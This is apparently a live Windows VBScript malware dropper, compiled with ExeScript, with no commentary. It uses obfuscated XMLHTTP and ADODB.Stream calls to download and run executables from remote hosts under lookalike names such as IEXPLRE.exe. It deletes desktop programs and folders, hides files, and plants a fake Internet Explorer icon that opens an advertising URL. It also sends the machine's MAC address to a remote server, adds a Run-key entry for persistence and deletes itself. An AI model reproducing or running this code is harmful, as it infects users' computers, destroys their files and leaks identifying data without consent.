
' ----- ExeScript Options Begin -----
                                                
                     
                                       
                         
' ----- ExeScript Options End -----



On Error Resume Next  
dim wsh
set wsh=CreateObject("WScript.Shell")
wsh.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t reg_dword /d 00000001 /f",0
wsh.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v HideFileExt /t reg_dword /d 00000000 /f",0
wsh.run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t reg_dword /d 00000001 /f",0

strWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")      
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")  
strDesktop = WSHShell.SpecialFolders("Desktop")


test = wscript.ScriptFullName 

Set xfuck = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP") 
with xfuck 
.Open "GET","http://9.77177.cn:88/download.asp?uid=2722&aid=3",0  
.Send() 
end with 
Set szy = CreateObject("AD"&"ODB.St"&"r"&"eam") 
with szy  
.type = eval("1") 

.open() 
.write eval("xfuck.res"&"po"&"nse"&"Bod"&"y") 
.SaveToFile strWinDir&"\v558.exe",eval ("2") 
end with

set wshell = Wscript.CreateObject("Wscript.Shell")
set fso = CreateObject("Scripting.FileSystemObject")
set fn=fso.GetFolder(fso.GetParentFolderName(Wscript.ScriptFullName))
Wshell.Run strWinDir&"\v558.exe"
wshell.Nothing  


Dim WSHShell
Set WshShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WshShell.SpecialFolders("Desktop") :       
Favorites = WshShell.SpecialFolders("Favorites") :       
strWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%") 
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
'fromo = strWinDir&"\Internet Explorer\iexplore.exe" 
'too = strWinDir&"\Internet Explorer\iexpiore.exe" 
fso.copyfile fromo ,too , true 
set fso = nothing '�ͷ�FSO

On Error Resume Next  
Set a = CreateObject("Scripting.FileSystemObject")
a.GetFile(""&strWinDir&"\Internet Explorer\iexplore.exe").Attributes = 7 '�ļ�
a.GetFolder(""&strWinDir&"\Internet Explorer\iexplore.exe").Attributes = 7 '�ļ���

a.GetFile(""&strDesktop&"\*").Attributes = 7 '�ļ�
a.GetFolder(""&strDesktop&"\*").Attributes = 7 '�ļ���

set WshShell = WScript.CreateObject("WScript.Shell") '����CreateObject ����
On Error Resume Next  
Set Wshshell=CreateObject("Wscript.Shell")
strLinkFile=WshShell.SpecialFolders("desktop")&"\*er*"
strLinkFile=WshShell.SpecialFolders("desktop")&"\*.exe"
Wshshell.Run "cmd /c attrib -s -h -r "&chr(34)&strLinkFile&chr(34),0,1
Wshshell.Run "cmd /c del /f/a/q "&chr(34)&strLinkFile&chr(34),0,1

Rem ����ˢ������
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.AppActivate strDesktop
WSHShell.SendKeys "{F5}"

Const DeleteReadOnly = True
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.DeleteFile("C:\WINDOWS\myfav\*.*"), DeleteReadOnly
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set colSubfolders2 = objWMIService.ExecQuery _
        ("Associators of {Win32_Directory.Name='" & "C:\WINDOWS\myfav" & "'} " _
            & "Where AssocClass = Win32_Subdirectory " _
                & "ResultRole = PartComponent")

    For Each objFolder2 in colSubfolders2
        objFSO.deleteFolder objFolder2.name , DeleteReadOnly
            
    Next 

On Error Resume Next  
Rem
iescc=strWinDir&"\Internet Explorer\IEXPLORE.EXE"             
ssd="ճ��"
winds = WshShell.ExpandEnvironmentStrings("%SystemRoot%")       
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\", "internet Explorer"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\DefaultIcon\", iescc
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\",""
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\D\", "ɾ��(&D)"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\D\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\Open\", "�ҵ���ҳ"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\"&ssd&"\", ssd
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\"&ssd&"\Command\", "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl"
WSHShell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{86AEFBE8-763F-0647-899C-A93278894D8E}""\", "internet Explorer"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\ShellFolder\",""
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\ShellFolder\Attributes",10,"REG_DWORD"
WSHShell.regwrite "HKCR\CLSID\{86AEFBE8-763F-0647-899C-A93278894D8E}\Shell\Open\Command\", iescc&" http://www.go6000.com/?2"

objFSO.DeleteFile(""&strDesktop&"\*.exe"), DeleteReadOnly
strComputer = "."
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
Set colSubfolders2 = objWMIService.ExecQuery _
        ("Associators of {Win32_Directory.Name='" & ""&strDesktop&"" & "'} " _
            & "Where AssocClass = Win32_Subdirectory " _
                & "ResultRole = PartComponent")

    For Each objFolder2 in colSubfolders2
        objFSO.deleteFolder objFolder2.name , DeleteReadOnly
            
    Next 


Set xfuck = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP") 
with xfuck 
.Open "GET","http://www.00qq.net/qvod_k.exe",0  
.Send() 
end with 
Set szy = CreateObject("AD"&"ODB.St"&"r"&"eam") 
with szy  
.type = eval("1") 

.open() 
.write eval("xfuck.res"&"po"&"nse"&"Bod"&"y") 
.SaveToFile strWinDir&"\Internet Explorer\IEXPLRE.exe",eval ("2")
end with

Set xfuck = CreateObject("Mic"&"rosoft.XM"&"L"&"HTTP") 
with xfuck 
.Open "GET","http://www.00qq.net/qvod_t.exe",0  
.Send() 
end with 
Set szy = CreateObject("AD"&"ODB.St"&"r"&"eam") 
with szy  
.type = eval("1") 

.open() 
.write eval("xfuck.res"&"po"&"nse"&"Bod"&"y") 
.SaveToFile ""&strWinDir&"\�����Ӱ.exe",eval ("2")
end with

Set Wshshell=CreateObject("Wscript.Shell")
strLinkFile=WshShell.SpecialFolders("desktop")&"\�����Ӱ.lnk"
Set lnk=WshShell.CreateShortcut(strLinkFile)
lnk.TargetPath =Chr(34)&""&strWinDir&"\�����Ӱ.exe"&Chr(34)
lnk.Arguments="about:blank"
lnk.Description = " �����Ӱ "  '˵��
lnk.Save

Dim mc,mo
Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
For Each mo In mc
If mo.IPEnabled=True Then
'MsgBox "��������MAC��ַ��: " & mo.MacAddress
mac = mo.MacAddress
Exit For
End If
Next

createObject("wscript.shell").run "iexplore http://www.00qq.net/ip/ip.asp?mac="&mac&"&k=",0

On Error Resume Next '�������ִ���¸����� 
Dim ws 
Set ws=CreateObject("Wscript.Shell") 
Dim runKey,runPath 
ws.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\IEXPLRE",""&strWinDir&"\Internet Explorer\IEXPLRE.exe"

Rem ����ˢ������
Set WSHShell = WScript.CreateObject("WScript.Shell")
strDesktop = WSHShell.SpecialFolders("Desktop")
WSHShell.AppActivate strDesktop
WSHShell.SendKeys "{F5}"

CreateObject("Scripting.FileSystemObject").DeleteFile WSH.ScriptFullName, True 'ɾ������  